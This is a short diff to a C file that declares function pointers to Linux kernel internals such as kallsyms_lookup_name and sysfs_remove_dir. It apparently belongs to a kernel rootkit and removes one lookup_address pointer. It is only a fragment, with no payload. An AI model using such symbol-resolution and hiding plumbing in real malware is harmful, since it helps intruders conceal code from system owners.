@@ -1,6 +1,5 @@
 #include "kernel_functions.h"
 
-pte_t* (*fn_lookup_address)(unsigned long address, unsigned int* level)   = (void*) rk_lookup_address;
 int (*fn_sysfs_remove_dir)(struct kobject*)                               = (void*) rk_sysfs_remove_dir;
 struct sock* (*fn_netlink_lookup)(struct net*, int, u32)                  = (void*) rk_netlink_lookup;
 unsigned long (*fn_kallsyms_lookup_name)(const char*)                     = (void*) rk_kallsyms_lookup_name;
